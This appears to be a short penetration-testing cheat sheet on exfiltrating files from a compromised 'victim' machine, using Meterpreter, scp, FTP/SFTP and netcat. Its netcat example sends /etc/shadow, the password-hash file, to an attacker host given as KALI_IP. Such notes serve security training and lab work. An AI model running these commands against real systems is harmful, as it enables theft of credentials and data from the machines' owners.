There are several methods depending on the access you've gained on the victim's machine:

#### Meterpreter (Metasploit)
If you have a **Meterpreter session** on the victim machine:
```
download /path/to/victim/file /path/to/local/destination
```

#### `scp` (Secure Copy)
If you have ***SSH access*** to the victim machine:

**Attacker's Machine**
```
scp username@victim_ip:/path/to/file /path/kali/destination
```

#### `nc` (Netcat)
If neither **SSH** or **Meterpreter** is ***available***, you can use **Netcat** to transfer files. You need to have `nc` ***installed and running on both machine***:

**Attacker's Machine**
```
nc -nvlp 4444 > shadow
```

**Victim's Machine**
```
nc KALI_IP 4444 < /etc/shadow
```

#### FTP or SFTP
If the victim machine has FTP or SFTP access, you can use these protocols to transfer files:

**FTP (Less Secure)**
```
1 Start an FTP server on Kali (using `vsftpd` or `pure-ftpd`).
2 Use the `ftp` command on the victim machine to connect and upload the file.
```

**SFTP**
If you have ***SSH access***, use `sftp` to transfer files:
```
sftp username@victim_ip:/path/to/file /path/to/local/destination
```


